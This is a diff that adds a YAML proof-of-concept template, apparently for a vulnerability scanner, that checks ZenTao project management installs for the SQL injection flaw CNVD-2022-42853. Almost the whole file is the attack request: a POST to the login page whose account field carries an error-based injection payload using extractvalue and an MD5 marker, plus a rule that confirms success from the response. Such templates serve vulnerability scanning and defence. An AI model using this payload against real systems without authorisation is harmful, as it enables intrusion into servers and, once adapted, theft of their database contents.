@@ -1,0 +1,26 @@
+name: yaml-poc-easycorp-zentao_pms-sql_injection-CNVD-2022-42853
+binding: 2fe7bdea-424f-47b2-b34d-9ac3b0b2c063
+detail:
+    author: system_user
+    links:
+        - https://www.cnvd.org.cn/flaw/show/CNVD-2022-42853
+    vulnerability:
+        id: 3ae078ce-1701-415e-83c7-140e84e1e668
+        level: high
+transport: http
+set:
+    rand: randomInt(100000, 200000)
+    url: request.url.host
+rules:
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /zentao/user-login.html
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+                Referer: http://{{url}}/zentao/user-login.html
+            body: account=admin'+and+(select+extractvalue(1,concat(0x7e,(select+SUBSTR(MD5({{rand}}),9,16)),0x7e)))#
+        expression: |
+            response.status == 200 && response.body.bcontains(bytes(substr(md5(string(rand)), 8, 16)))
+expression: r1()
